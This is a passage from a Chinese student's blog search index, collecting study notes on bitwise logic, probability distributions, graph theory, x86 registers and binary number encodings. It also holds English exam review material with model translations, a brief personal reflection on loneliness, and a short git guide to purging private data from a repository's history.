真值表: ^ 0 1 0 0 1 1 1 0 逻辑取反 !当初写c++最常见的，对所有不为0的数结果为0，所有的0结果为1 真值表: 操作符 0 1 2 …… n ！ 1 0 0 0 0 按位取反 ~对每一位二进制位进行取反 真值表: 操作符 0 1 ~ 1 0","link":"/2021/11/09/%E4%BD%8D%E8%BF%90%E7%AE%97%E6%80%BB%E7%BB%93/"},{"title":"几种重要的分布","text":"概率论中的重要分布离散型二项分布0~1分布为特殊的二项分布 形式： X ~ b(n, p) 或 X ~ B(n, p) 分布律：P{X = k} = $\\C_n^k$ p^k^ (1 - p)^n-k^ 期望：$np$ 方差：$np(1-p)$ 泊松分布形式： X ~ $\\pi$ ($\\lambda$) 分布律：P{X = k} = $\\frac{\\lambda ^ k}{k!}$ $e^{-\\lambda}$ (k = 0, 1, 2……) 期望：$\\lambda$ 方差：$\\lambda$ 连续性均匀分布形式：X ~ U(a, b) 密度函数：$f(x)=\\begin{cases}\\frac {1}{b - a} &amp; \\text{a &lt; x &lt; b}\\0&amp; \\text{其他}\\end{cases}$ 期望：$\\frac{a+b}{2}$ 方差：$\\frac{(b-a)^2}{12}$ 指数分布形式：X ~ $E(\\lambda)$ 密度函数：$f(x) =\\begin{cases}\\lambda e^{-\\lambda x} &amp; \\text{x &gt; 0}\\0 &amp; \\text{其他}\\end{cases}$ 期望：$\\frac{1}{\\lambda}$ 方差：$\\frac{1}{\\lambda^2}$ 正态分布形式：X ~ $N(\\mu, \\sigma^2)$ 密度函数：$f(x) = \\frac {1}{\\sqrt{2\\pi}\\sigma} e^{-\\frac{(x - \\mu)^2}{2 \\sigma^2}}$ 期望：$\\mu$ 方差：$\\sigma^2$ 性质","link":"/2021/12/07/%E5%87%A0%E7%A7%8D%E9%87%8D%E8%A6%81%E7%9A%84%E5%88%86%E5%B8%83/"},{"title":"图的矩阵表示","text":"图的矩阵表示关联矩阵 M(D) M(G)有向图的关联矩阵无环有向图$D=, V={v_1,v_2,…,v_p},E={e_1,e_2,…,e_q}$ $p×q$ 阶矩阵$M(D)=(m{ij}) {p×q}$,其中 $m_{ij} = \\begin{cases}1 &amp; \\text{若vi是ej的起点}\\-1 &amp; \\text{若vi是ej的终点}\\0 &amp; \\text{若vi不关联ej}\\end{cases}$ 称M(D)为G的关联矩阵 无向图的关联矩阵无环无向图$G=,V={v1,v2,…,vp},E={e1,e2,…,eq}$ 则矩阵$M(G)=[m{ij}] {p×q}$,其中 $m_{ij} = \\begin{cases}1 &amp; \\text{若vi关联ej}\\0 &amp; \\text{若vi不关联ej}\\\\end{cases}$ 称M(G)为关联矩阵 无向图基本关联矩阵的秩定理：$G$ 连通 ⇒ $r(M_f(G))=n-1$ 推论1：$G$ 有 $p$ 个连通分支 ⇒ $r(M_f(G))=n-p$ 推论2：$G$ 连通 ⇔ $r(M(G))=r(M_f(G))=n-1$ 用关联矩阵求所有生成树 忽略环, 求关联矩阵 $M$ 任选参考点, 求基本关联矩阵 $M_f$ 求 $M_f$ 中的所有 $n-1$ 阶子方阵,计算行列式,行列式的值模2非0的是生成树 邻接矩阵 A(D) A(G) 邻接矩阵求通路数 可达矩阵 P(D) P(G) 求法","link":"/2021/12/15/%E5%9B%BE%E7%9A%84%E7%9F%A9%E9%98%B5%E8%A1%A8%E7%A4%BA/"},{"title":"删除repo中的隐私数据","text":"删除repo中的隐私数据Sometimes，在写代码的过程中，一些variable带有隐私信息，尽管时候在github上删除相关内容，但是在history commit中仍然存在，所以得想其他的办法 思路【思路】：建立新的分支 -&gt; 删除原本分支 -&gt; 将新分支作为主分支 实现 创建并切换到新的分支 git checkout --orphan lateset_branch 添加所需文件(假设所有) git add -a 提交当前分支的修改 git commit -m 'something u wanna say' 删除本地 main 分支 git branch -d master 重命名当前分支 git branch -m main push 到远程仓库 git push -f origin main","link":"/2022/07/24/%E5%88%A0%E9%99%A4repo%E4%B8%AD%E7%9A%84%E9%9A%90%E7%A7%81%E6%95%B0%E6%8D%AE/"},{"title":"可简单图化、连通图、欧拉图和哈密顿图的判断","text":"可图化设非负整数数列d=( d1,d2, …, dn ),若存在无向图G, 使得G的度数列是d, 则称d为可图化的. 可简单图化设非负整数列d=( d1,d2, …, dn ),若存在无向简单图G, 使得G的度数列是d,则称d为可简单图化的. 可图化充要条件非负整数列d=(d1,d2,…,dn)是可图化的, 当且仅当d1 + d2 + … + dn = 0(mod 2) 握手定理 可简单图化充要条件（Havel定理）设非负整数列d=(d1,d2,…,dn)满足: $\\begin{cases}{d1+d2+…+dn=0(mod 2)}\\{n-1≥d1≥d2≥…≥dn≥0}\\end{cases}$ 则d可简单图化当且仅当d’=(d2-1,d3-1,…,dd1+1-1, dd1+2,…,dn)可简单图化 该定理的两个条件： 可图化； 最大度小于等于n-1 例: d=(4,4,3,3,2,2)可简单图化 &lt;=&gt; d’=(3,2,2,1,2)可简单图化 d’中注释数也就是第一个数个后续的数减一 Havel定理等价形式非负整数d=(d1,d2,…,dn) 可简单图化当且仅当 $d1+d2+…+dn=0(mod 2)$ 并且对r=1,2,…,n有 $d1+d2+…+dr ≤ r(r-1)+min(r,dr+1)+min(r,dr+2)+…+min(r,dn)$ 欧拉图 无向欧拉图的充分必要条件 无向半欧拉图的充分必要条件 有向欧拉图的充分必要条件 有向半欧拉图的充分必要条件 哈密顿图 无向哈密顿图的必要条件 无向半哈密顿图的充分条件 无向哈密顿图的充分条件","link":"/2021/12/08/%E5%8F%AF%E7%AE%80%E5%8D%95%E5%9B%BE%E5%8C%96%E3%80%81%E8%BF%9E%E9%80%9A%E5%9B%BE%E3%80%81%E6%AC%A7%E6%8B%89%E5%9B%BE%E5%92%8C%E5%93%88%E5%AF%86%E9%A1%BF%E5%9B%BE%E7%9A%84%E5%88%A4%E6%96%AD/"},{"title":"大英三期中考试复习计划","text":"阅读理解 快速阅读（阅读教程1-3） 选词填空（综合教程1-3） 深度阅读（2篇，1篇来自阅读教材1-3） 词汇 6篇文章需要把综合教程的习题全部做一遍，当然，做之前必须把课文过一遍 翻译 一共6篇 听力U校园重点内容做一遍 Unit 3 3-1 Inside view Conversation 2 3-2 Outside view 3-3 Listening in 2 New Reports Passage 1 Passage 2","link":"/2021/11/08/%E5%A4%A7%E8%8B%B1%E4%B8%89%E6%9C%9F%E4%B8%AD%E8%80%83%E8%AF%95%E5%A4%8D%E4%B9%A0%E8%AE%A1%E5%88%92/"},{"title":"大英三期末复习","text":"题纲 Summary(1-7单元)UNIT 11.1 catching crabsThe author and his schoolmates were in their final year and had to plan for their future. Actually, but the author thought his family would criticize him as he didn’t want to follow his father’s path to become a lawyer. However, his father didn’t do that, he invited him to catch some crabs and talk more. They noticed that one crab was trying to climb out , but pulled back by others, trying to defy his fellow captives, but without luck. Finally, he gave up his struggle to escape and began to stop others trying to escape. His father told him not to be pulled back by others and get to know himself better. 1.2 We are all dyingI have some good news and some bad news for you. The bad news is that we are all dying, and the good news is that we can get to choose the way of our life. What we need to do is to act now. First, stop waiting for the right time. Remember that tomorrow is just another version of now, an empty field that will remain so unless we start planting some seeds. Second, do what we want to do. We come this way but once so let’s make the best of the short stay. And fill your time with the riches on offer and become a person you want to be. UNIT 22.1 The Glass CastleThe author’s family never believed in Santa myth, as her parents could not afford expensive gifts. In her mother’s view, the children have been brainwashed into believing the silly myth. So their family celebrated Christmas about a week after Dec. 25 and the kids got their gifts from after-Christmas sale. On that year, the father lost his job and they had no money for Christmas. On Christmas Eve,the father took each of the kids out into the desert night one by one and asked them to pick out a star as their Christmas gift. The author claimed Venus and when the sun starts to burn out and Earth turns cold, every one here might want to move to Venus to get warm. And they’ll have to get permission from your descendants first. The father’s imagination lead to a unique Christmas. 2.2 Cultual ChildhoodsEnormous transformations have taken place in children’s lives and in the ways they are thought about and treated when comparing Children in the past and today. There are Vast differences between contemporary and historical children on children’s responsibility and expectations on them. These changing ideas about children have led many social scientists to claim that childhood is a “social construction”. Understandings of childhood are not the same everywhere. Social anthropologists seek to avoid imposing outside ideas onto people with very different understanding of raising their children. Childhood is changing and what anthropologists and other social scientists are interested in are the ideas that each society has about the nature of childhood and the impact these views have on children’s lives. UNIT 33.1 How We ListenFor the sake of clarify,we split up the process of listening to music into three hypothetical planes.Firstly,the sensuous plane.It is a kind of brainless but attractive state of mind engendered by the mere sound appeal of the music.Secondly,the expressive plane.It is when we believe each piece of music has a theme,which mirrors a different world of feeling,such as gaiety,sadness.Thirdly,the musical plane.It is the ability to experience different musical elements,such as melodies,the rhythms,the harmonies,the tone colors etc. We usually listen to music on all three planes. 3.2 The photoV-J Day in Times Square is a photograph by a prominent photographer that portrays an American sailor kissing a woman in a white dress on Victory over Japan Day in Times Square in New York City, on August 14. Since its publication, it has commanded the world’s attention. It brims with perceived uncontrolled passion and sexual tension. Also, it ignites the imagination of people, who devised story lines about what ever happened to the couple. Most important of all, it sketches for people a beautiful vision of life after the Second World War, with a sprint towards a more prosperous standard of living and inventive ideal family life. Though the years pass, the photo will never fade and remind people of the fond memory they have had. UNIT 44.1 Golden memoriesThe house was built in a clearing in the huge orchard many families ago. The master from the manor house sent workmen to haul the golden stone from the local quarry and they spent three months constructing two cottages in the park. The groundsman lived in this house with a young woman and later his family, and it felt good to look after the happy couple. Then a new family arrived, a smart man with his family,it seemed as if no one spent much time at home any more. The house liked the two middle-aged women because of the care they showed. It have to admit it resented a later family with a pet dog. The house liked the last person Joseph as they kept each other company.We don’t know what happened to the stone house at last, but it witnessed the social and family changes . 4.2 No place like home?So is homesickness just associated with a lack of maturity? In the past the term homesickness can be found in Homer’s Odyssey. In the 17th century, Swiss were described to have the feeling of homesickness, it used to be seen as a dangerous disease that people could die from. However, during the 18th and 19th centuries, it was considered virtuous to miss your home, especially for women. Recently many people , reveal they suffer from homesickness. Professional exiles, homesick is acknowledged as a part of culture shock. Nostalgia, now regarded as a sentimental enjoyment of the past, remains closely related to homesickness. Homesickness is both a painful longing to be back home, and an extremely common occurrence. It’s not immature or something to be ashamed. UNIT 55.1 Dinner at Joanne’sWhen a young black man arrives in a crowded and expensive restaurant,the head waiter makes him sit in the least comfortable place,even though a table has been booked for him and a “Ms Rogers”. When Ms Rogers arrives,the waiter realizes that she is a well-known Senator; and Ms Roger realizes that her friend has been treated badly because of the color of his skin. The waiter realizes his mistake too,and tries to make up for it,but it’s too late. 5.2 We theySaudi brothers just have business with the people they have trust in. The Swedes and the Saudis in this true story have different concepts of the role of personal relationships in business.At the root of the difference between these cultures is a fundamental issue in human societies:the role of the individual versus the role of the group.In a society called collectivist, the interest of the group prevails over the interest of the individual and the family pattern is called extended family. They think of themselves as a part of we group, and they dependent on each other both practically and psychologically.In another society named individualist, the interests of the individual prevail over the interests of the group and the family pattern is nuclear family. They have their personal identity, and they are independent UNIT 66.1 Christmas Day in the morningAs a young boy, the writer overheard his parents talking about helping his father do the milking early every morning. He realized that he has taken his father’s love for granted. So on Christmas morning he rose very early and crept downstairs and did the milking all alone. When his father discovered what he had done, he clutched the boy in his arms. Now, as an older man, he decides to trimmed the Christmas tree and tie his present and letter to his beloved wife before she gets up. 6.2 Chinese or Western, it’s a time to relaxThere is concern among the Chinese scholars and students that Christmas has an increasing impact on the Chinese culture. Due to the changes in the past two decades, we Chinese do seem to attach a lot more attention to Christmas today than we did in the past. In fact, be it in China or in the West, a festival carries the same meaning featured by celebrations, a feast or humble meal, relaxation and a break from the skulduggery or the mundane affairs. However, no one can be left untouched by the festivals in the Gregorian calendar though we follow the lunar calendar. The festival spirit of the West has influenced us. The fear of the impact of the decadence of the West on Chinese culture is not well grounded, as no culture in the world is free of decadence. Consequently, we Chinese should not follow the West blindly, but accept the goodness the Western festivals offer and practice what they stand for. UNIT 77.1 Last man downThe text from Last Ma Down offers an eyewitness account of defining historical event of 9/11 attack from the perspective of Richard Picciotto, a firefighter; his story is that of a man, a hero,and a tragic event that inspired the nation. His recount isn’t one of death and destruction, but a celebration of life and it’s unpredictable nature. 7.2 Eleanor RooseveltWhen Eleanor Roosevelt was young, she is kind-hearted and responsible, concerning for women’s issues, labor issues and so on. By the time she and FDR moved to White House ,she was coming into her own. She rewrote the definition of First Lady by helping crippled President Roosevelt and being involved with New Deal projects. She also served as a US delegate to the United Nations and oversaw the process of drafting and securing passage of the Universal Declaration of Human Rights. By the time she resigned from her UN post, she had become the “First Lady of the World”. Even at 77 she came back to the UN and host of her own TV show. Eleanor Roosevelt was inducted into the Hall of heroes. 汉译英U1 中国有一句话，叫“人贵有自知之明”。这个观念的最早提出者是老子。老子在《道德经》里说“知人者智，自知者明”。有“自知之明”是指人应该对自己有正确的认识，了解自身的优点和缺点，清醒地知道自己能做什么。我们把人的自知视为“贵”，可见做到“自知”是多么的不易。“自知之明”是一种人生哲学，也是一种品德。它可以帮助我们不断地修正自己，朝着更高的人生目标迈进。 As the Chinese saying goes, it is important to know oneself. The first person to put forward this notion was Laozi, who wrote in his book Dao De Jing: “A person who knows others is intelligent, but a person who knows himself is insightful.” To know oneself is to have a correct understanding of oneself, including one’s strengths and limitations, and to be clear-minded about what one can do. We cherish this virtue so much precisely because it is really hard for people to know themselves. Knowing oneself is both part of a philosophy of life and a virtue that can facilitate self-improvement and attainment of a higher life goal. U2 与父辈相比，现在的孩子在物质生活上要丰富得多，但在精神上则略有欠缺。他们不太可能和伙伴们一起玩，玩具取代伙伴成了他们最忠实的朋友。他们的父母从不缺钱给他们买各种贵重玩具。这样的好处是：他们不再整天缠着父母，因为玩具和电子游戏减轻了他们的孤独感。但也有负面影响：沉迷于玩具和电子游戏会让孩子视力下降或者让他们不愿意与别人交流。这种现象应引起家长和学校的关注。 Compared with the childhood of their parents, children now do enjoy a far better material life, but their emotional life seems less satisfying. They are less likely to play with their peers, for toys have replaced their playmates as their most loyal friends. Their parents can always afford to buy them all kinds of expensive toys. The good thing about this is that they no longer pester their parents to play with them all day long, because toys and video games have lessened their feelings of loneliness. But there are also negative effects: The addiction to toys and video games may cause a child’s eyesight to deteriorate or result in reluctance to communicate with others. These phenomena should demand the attention of both parents and schools. U3 在敦煌莫高窟，最著名的艺术杰作要数壁画“飞天”（flying apsaras）。敦煌飞天是印度文化和中国文化共同孕育而成的。在印度，被称为“飞天”的空中飞行的天神（celestial beings）多出现在佛教石窟壁画（grotto mural）中，中国道教传统则把在空中飞行的天神称为“飞仙”（flying immortals）。魏晋南北朝时，佛教初传入中国，壁画中的飞仙开始被称为“飞天”。后来，随着佛教在中国的深入发展，佛教的飞天和道教的飞仙在艺术形象上相互融合。敦煌莫高窟的飞天是中国古代艺术家的杰作，是世界艺术史的奇迹。 In the Mogao caves in Dunhuang, the murals with “flying apsaras” are one of the most well-known artefacts. The flying apsaras in the Dunhuang Grotto Murals are a product of the intermixing of Indian and Chinese culture. In India, flying celestial beings called “flying apsaras” appear mostly in murals in Buddhist caves, while in the Chinese Daoist tradition, flying celestial beings are known as “flying immortals”. During the Wei, Jin, and Northern and Southern dynasties, when the introduction of Buddhism in China was at an early stage, people began to use the term “flying apsaras” to refer to the flying immortals in the murals. Later, with the development of Buddhism in China, the artistic images of Buddhist flying apsaras and Daoist flying immortals merged with each other. The flying apsaras in the Dunhuang Grotto Murals are a most ingenious creation of ancient Chinese artists, and a marvel in the history of world art. U4 目前，中国老年人口居世界第一，已经进入老龄化社会。而中国现在正处于社会转型期，建立一个完整的社会福利体系仍需很长的一段时间，因此中国的养老问题较为特殊。预计在今后半个世纪，家庭养老仍然是中国主流的养老模式。孝敬父母（filial piety）一直是中国传统伦理道德（ethics）的重要组成部分。在当今这样一个老龄化的社会中，弘扬孝道就显得更加重要，因为在鼓励人们对家里的老人提供日常照顾和情感慰藉方面，孝道仍将起关键性的作用。 China, with the largest population of elderly people in the world, has become an ageing society. Meanwhile, China is also a country undergoing social transition. It will be a long time before a sound social welfare system can be established, which means that China is in a unique situation when it comes to care of its ageing population. It is predicted that in the next 50 years, family care for the aged will still be the dominant practice in China. Filial piety has always been a significant part of traditional Chinese ethics. In today’s ageing society, it will be all the more important to promote the virtue of filial piety, as it will continue to play a crucial role in encouraging people to take good care of their elderly family members by providing daily care and emotional support. U5 女性是劳动力市场的重要组成部分。但是当前劳动就业中的性别歧视仍然存在，这与我国构建和谐社会的要求背道而驰。就劳动者而言，不能人尽其才，不仅造成人力资本投资的浪费，还会使她们对社会公正产生怀疑；就用人单位而言，性别歧视不仅破坏人才选拔的程序，造成人才浪费，也会不利于人们正确理解何为正常运转的市场；就社会而言，性别歧视不仅干扰人力资源的正常流动，还会破坏就业市场的公平环境。 Women are an important part of the labour force. But gender discrimination in the job market still exists, and serves as a counterforce to the building of a harmonious society. As far as employees are concerned, jobs that do not suit their talents will not only give rise to a waste of the investment in human capital, but also cause them to lose faith in social justice. As for employers, gender discrimination will not only disrupt the process of selecting talent,and thus waste talent, but will also harm the perception of a properly functioning market. On the level of society, gender discrimination will set an obstacle to the proper distribution of human resources, and damage a fair environment in the job market. U6 春节是中国最重要的传统节日。但近年来，很多人都抱怨过年的气氛越来越淡，已经很难感受到记忆中过年的那种美好感觉了。事实上，春节在过去之所以显得重要，是因为只有到了春节人们才能享美食、穿新衣。而随着中国经济的迅速发展，人们的物质生活越来越丰富，人们庆祝春节的方式也发生了一些变化。比如说，越来越多的人选择过年时外出旅游。但无论如何，对于中国人来说，春节的重要性是不可替代的。 The Spring Festival is the most important traditional holiday in China. But in recent years, many people have complained that the celebratory atmosphere of lunar New Year is not as strong as it used to be, and it is hard for them to regain that wonderful feeling in their memories. In fact, in the past, it was only during the Spring Festival that people could enjoy delicious food and wear new clothes. This explains why this holiday was so important to Chinese people. But with the rapid development of the Chinese economy and an increasingly rich material life, the ways in which Chinese people celebrate the Spring Festival have changed. For instance, more and more Chinese people choose to travel during the Spring Festival. Nonetheless, for Chinese people, the Spring Festival plays an irreplaceable role in their culture. U7 中国是世界上自然灾害较为严重的国家之一。在和平时期，抢险救灾是中国军队的一项重要任务。中国军队是抢险救灾的突击力量，承担最紧急、最艰难、最危险的救援任务。中国军人都是抱着打仗的心态在救灾，甚至冒着生命危险抢救灾民。每当解放军抵达灾区，群众都热烈欢迎，感到无比欣慰。中国军队在历次灾难救援中表现出的组织性、专业性、高效性赢得了人民群众的信任和赞誉。 China is one of the countries that are most affected by natural disasters. In peacetime, rescue and relief work is an important part of the mission of the Chinese military. China’s armed forces always form task forces for rescue and relief work, taking on the most urgent, most difficult and most dangerous jobs. Chinese military personnel perform their rescue and relief work as if they were fighting a war, sometimes even at the risk of their own lives. Whenever the People’s Liberation Army (PLA) arrives at an area hit by a natural disaster, the local people will welcome them warmly and feel greatly relieved. The sense of organization, professionalism and efficiency they have displayed has helped them win the trust and praise of the public. U8 古希腊神话的最大特点就是神和人形相同、习相近。古希腊人按照人的形象来创造神，神有人的感情欲望。而中国古代神话中的神大多距离人类生活较远。中国神话中正面形象的神多具有崇高的品格、伟大的志向以及为实现伟大理想而斗争的不屈不挠的精神。他们承担着维护宇宙秩序的崇高责任，是社会道德的楷模。可以说中国古代神话中的神多具有超凡脱俗的品格，神性多于人性。 The most important characteristic of ancient Greek mythology is that gods and humans are similar, both in physical appearance and personality. Ancient Greeks created their gods in their own image, and their gods have human emotions and desires. In Chinese mythology, however, the life of the gods is very different from that of humans. The good gods in Chinese mythology have a noble character, express great aspirations, and show perseverance in fighting for great ideals. They have the noble duty of maintaining the order of the universe; they are social and moral role models. It can be said that the gods in Chinese mythology have extraordinarily noble characters, and possess more of the qualities of gods than of humans. 听力Unit 1Unit 2Unit 3Unit 4Unit 5 Unit 6 Unit 7 Unit 8 Conversation 1 Conversation 2 Outside view Listening in","link":"/2022/01/03/%E5%A4%A7%E8%8B%B1%E4%B8%89%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/"},{"title":"孤独","text":"孤独，是近来我生活的色调，行事的方式已经不像之前有个心里的寄托，能在任何时候无所畏惧现在只有我一个人独行总是在幻想身边出现形影不离的人无数次做梦梦到她的回来即使是在醒来之后责骂自己但还是怀念那种心中念想着别人的感觉尽管知道不可能，但是我自己不允许我自己放弃这对我来说是莫大的悲哀对生活感到失望感到无助","link":"/2021/11/10/%E5%AD%A4%E7%8B%AC/"},{"title":"寄存器","text":"寄存器在Debug命令中我查了一些寄存器的相关知识，这篇文章仔细分析一下部分寄存器 通用寄存器AX BX CX DX 用于存放数据 可见有2个字节byte 2byte = 16bit ，所以都为16位寄存器 范围 0 ~ 65535 它们可以各自分割为 2个8位寄存器 AX = AH + AL BX = BH + BL CX = CH + CL DX = DH + DL 高低位寄存器运算是互相独立的，也就是说低位寄存器运算的溢出结果不会进入到高位 地址寄存器DS ES SS CS 左为 段地址，右为 偏移地址 段地址 : 偏移地址 段地址寄存器 偏移地址寄存器 DS SP ES BP SS SI CS DI IP BX 物理地址 = 基础地址 + 偏移地址 物理地址 = 段地址 × 16(10H) + 偏移地址 不同尺寸的数据字节型数据1 byte 8bit - 8位寄存器中 字型数据2 byte 16bit - 16位寄存器中 CPU 区分指令和数据我们都知道，指令和数据在根本上没有任何区别 U命令 将某个内存地址开始的的字节全部当作指令D命令 将某个内存地址开始的的字节全部当作数据 在任意时刻，CPU将 CS : IP 所指向的内容全部当作指令来执行","link":"/2021/12/06/%E5%AF%84%E5%AD%98%E5%99%A8/"},{"title":"支配集、覆盖集、独立集与匹配","text":"支配集设图$G=$是简单无向图，$S⊆V,S≠∅$，若对于$∀x∈V-S$，$x$都与$S$里至少一个顶点相邻，则称$S$是图$G$的支配集(dominating set)。 $S$是图$G$的支配集，若S的任何真子集都不是支配集，则称$S$为图$G$的极小支配集(minimal dominating set)。 $S$是图$G$的支配集，若不存在任何其它支配集$S’$，使得$|S’|＜|S|$，则称S是图G的最小支配集(smallest dominating set)。 若$S$是图$G$的最小支配集，则称$|S|$为图G的支配数(dominating number)，记作$γ(G)$。 例：在图中，$S_0={V_0}，S={V_1,V_4,V_7} ，S_2 ={V_1,V_3,V_5,V_7}$都是G的支配集，且都是极小支配集，$S_0$是最小支配集， 因此$\\gamma(G)=1$. 极小支配集求法 独立集无向图$G=$, $S⊆V$ 独立集: $∀u,v∈S, (u,v)∉E$ 极大独立集: $S$是独立集, 其真母集都不是 最大独立集: $|V*|$最大的独立集 独立数: $\\beta_0(G)=|S|$, $S$是最大独立集 极大独立集求法 点覆盖无向图$G=$, $S⊆V$ 点覆盖: $∀e∈E$,$ ∃v∈S$, $v$关联$e$ 极小点覆盖: $S$是点覆盖, 其真子集都不是 最小点覆盖: $|S|$最小的点覆盖 点覆盖数: $\\alpha_0(G)=|S|$, $S$是最小点覆盖 极小点覆盖集求法 边覆盖n 无向图$G=, E^*⊆E$ 边覆盖: $∀v∈V, ∃e∈E^*, e$关联$v$ 极小边覆盖: $E^*$是边覆盖, 其真子集都不是 最小边覆盖: $|E^*|$最小的边覆盖 边覆盖数: $\\alpha_1(G)=|E^|, E^$是最小边覆盖 匹配无向图$G=, E^*⊆E$ 匹配(边独立集): $∀e,f ∈E^*, e,f$ 不相邻 极大匹配: $E^*$是匹配, 其真母集都不是 最大匹配: $|E^*|$最大的匹配 匹配数: $\\beta_1(G)=|E^|, E^$是最大匹配","link":"/2021/12/26/%E6%94%AF%E9%85%8D%E9%9B%86%E3%80%81%E8%A6%86%E7%9B%96%E9%9B%86%E3%80%81%E7%8B%AC%E7%AB%8B%E9%9B%86%E4%B8%8E%E5%8C%B9%E9%85%8D/"},{"title":"平面图","text":"平面图在平面上边与边不在非顶点处相交的图 平面嵌入画在平面上使得边与边不在 非顶点处相交的图 可平面图主要表明图具有平面性质,平面嵌入是平面图的一种表示形式,平面图的平面嵌入不唯一 面和次面(face): 区域及其边界 面的次数(degree): $deg( R )$ = 边界长度，就是这个面相邻几个边 $\\displaystyle\\sum\\limits_{i=0}^r deg(Ri)$ = 2m r(面数) 极大平面图简单平面图, 但是在任意两个不相邻顶点之间加边就是非平面图 特点： 极大平面图一定是连通图 极大平面图一定不含有割点和桥 割点：一个无向连通图，删除一个点及其连接边，若此连通图不再联通，再此点称为割点 桥：类似于割点，不过是边 极大平面图的每个面的次等于3（定理） n(n ≥ 4)阶极大平面图G中,d(G) ≥ 3 欧拉公式设G是连通平面图, 则 n - m + r = 2 其中r是G的面数,n是G的阶,m是G的边数 推论 设n阶简单平面图有m条边，则 m $\\leq$ 3n - 6 设n(≥ 3)阶简单极大平面图G有m条边,则 m = 3n - 6. 11.7 11.8 11.10 同胚同胚: 反复插入或删除2度顶点后同构 Kuratowski 定理 对偶图 对于每一个平面图， 都有与其相对应的对偶图. 我们假设上面的例图是图G， 与其对应的对偶图G*， 那么对于G*来说， G*上面的每一个点， 对应的是G里面的每一个面. 比如说下面就是G* 上面的点就是对偶图G里的点.那么关于对偶图G*里的边呢 ? 对于G中本来的每条边e， 他是两个面(比如说面f1和f2)的交边， 那么在对偶图里， 我们对这两个面(f1， f2)所映射在G*里的点连线(f1* 连向f2*). 如果f1 == f2(比如说G中5， 6这条边， 边的两侧都是同一个面， 那我们就建一条回边.图就长这样(回边在5， 6那里). n=|V(G)|,m=|E(G)|,r是G的面数。n*=|V(G*)|,m*=|E(G*)|,r*是G*的面数。p是G的连通分支数，则 对偶图的性质： 对于连通平面图G，G*与G互为对偶图. 如果G是平面图,则G*也是平面图。 若边e为G中的环,则G*与e对应的边e*为桥; 若e为桥, 则G*中与e对应的边e*为环. 在多数情况下,G*含有平行边. 同构的平面图的对偶图不一定同构. 任何平面图的对偶图总是连通的 自对偶图自对偶图: G ≅ G* 轮图W~n~ :在 n-1 (n ≥ 4) 边形 Cn-1 内放置一个顶点，使其与 C~n-1~ 上 n-1 个顶点均相邻。 n ≥ 4时, 轮图 W~n~ 是自对偶图","link":"/2021/12/05/%E5%B9%B3%E9%9D%A2%E5%9B%BE/"},{"title":"概统复习笔记","text":"互斥事件和相互独立事件 如果不能同时发生，则互斥 如果可以同时发生，但二者没关系 独立就像你和我，谁也不认识谁 互斥就是有你没我，有我没你 相互独立的判断 事件运算的常用公式 重要的分布 本地文件 博客链接 期望与方差的计算公式 统计量 统计量不含任何未知参数 三种常见分布 置信区间 协方差 相关系数 切比雪夫不等式 假设检验 全概率、贝叶斯公式 二维连续型随机变量 中心极限定理独立、同分布中心极限定理 二项分布中心极限定理 参数估计矩估计 最大似然估计 无偏估计 有效估计 概率密度 性质","link":"/2021/12/28/%E6%A6%82%E7%BB%9F%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"title":"机器数 真值 原码 反码 补码","text":"机器数 真值 原码 反码 补码各个进制的英文 十六进制（Hexadecimal） 1 2 3 4 5 6 7 8 9 A B C D E F 十进制（Decimal） 八进制（Octal） 二进制（Binary） 通常在数后面跟上各进制的英文首字母来表示这个数是哪个进制。 机器数与真值机器数：通常将数值数据在计算机内部编码表示后的数称为机器数 真值：机器数真正的值（即现实世界中带有正负号的数）称为机器数的真值 源码原码就是符号位加上真值的绝对值, 即用第一位表示符号, 其余位表示值. 比如如果是8位二进制123[+1] = 0000 0001 //+1的源码[-1] = 1000 0001 //-1的源码第一位是符号位 因为第一位是符号位, 所以8位二进制数的取值范围就是: [1111 1111 , 0111 1111] 即 [-127 , 127] 原码是人脑最容易理解和计算的表示方式 源码定点小数表示范围：- ( 1 - 2^-n^ ) ~ + ( 1 - 2^-n^ ) 8位字长原码表示的有符号定点小数真值范围： 1.1111111b～0.1111111b 即： -(127d/128)d～+(127/128）d 反码反码的表示方法是: 正数的反码是其本身 负数的反码是在其原码的基础上, 符号位不变，其余各个位取反. 123[+1] = [00000001]原 = [00000001]反[-1] = [10000001]原 = [11111110]反 可见如果一个反码表示的是负数, 人脑无法直观的看出来它的数值. 通常要将其转换成原码再计算. 补码补码的表示方法是: 正数的补码就是其本身 负数的补码是在其原码的基础上, 符号位不变, 其余各位取反, 最后+1. (即在反码的基础上+1) 123[+1] = [00000001]原 = [00000001]反 = [00000001]补[-1] = [10000001]原 = [11111110]反 = [11111111]补 对于负数, 补码表示方式也是人脑无法直观看出其数值的. 通常也需要转换成原码在计算其数值. 移码定义：移码（又叫增码或偏置码）通常用于表示浮点数的阶码，其表示形式与补码相似，只是其符号位用“1”表示正数，用“0”表示负数，数值部分与补码相同。 缘由：用补码表示阶码的时候，当阶码无限小，产生了下溢的时候，阶码变成了0，那么这个浮点数的值变为了1。而实际上这个数是无限接近于零的。那么我们就需要取出其中的 “-0“ 值作为机器零。 源码、反码、补码的意义在开始深入学习前, 我的学习建议是先”死记硬背”上面的原码, 反码和补码的表示方式以及计算方法. 现在我们知道了计算机可以有三种编码方式表示一个数. 对于正数因为三种编码方式的结果都相同: [+1] = [00000001]原 = [00000001]反 = [00000001]补 所以不需要过多解释. 但是对于负数: [-1] = [10000001]原 = [11111110]反 = [11111111]补 可见原码, 反码和补码是完全不同的. 既然原码才是被人脑直接识别并用于计算表示方式, 为何还会有反码和补码呢? 首先, 因为人脑可以知道第一位是符号位, 在计算的时候我们会根据符号位, 选择对真值区域的加减. (真值的概念在本文最开头). 但是对于计算机, 加减乘数已经是最基础的运算, 要设计的尽量简单. 计算机辨别”符号位”显然会让计算机的基础电路设计变得十分复杂! 于是人们想出了将符号位也参与运算的方法. 我们知道, 根据运算法则减去一个正数等于加上一个负数, 即: 1-1 = 1 + (-1) = 0, 所以机器可以只有加法而没有减法, 这样计算机运算的设计就更简单了. 于是人们开始探索 将符号位参与运算, 并且只保留加法的方法. 首先来看原码: 计算十进制的表达式:1-1=0 1 - 1 = 1 + (-1) = [00000001]原 + [10000001]原 = [10000010]原 = -2 如果用原码表示, 让符号位也参与计算, 显然对于减法来说, 结果是不正确的.这也就是为何计算机内部不使用原码表示一个数. 为了解决原码做减法的问题, 出现了反码: 计算十进制的表达式: 1-1=0 1 - 1 = 1 + (-1) = [0000 0001]原 + [1000 0001]原= [0000 0001]反 + 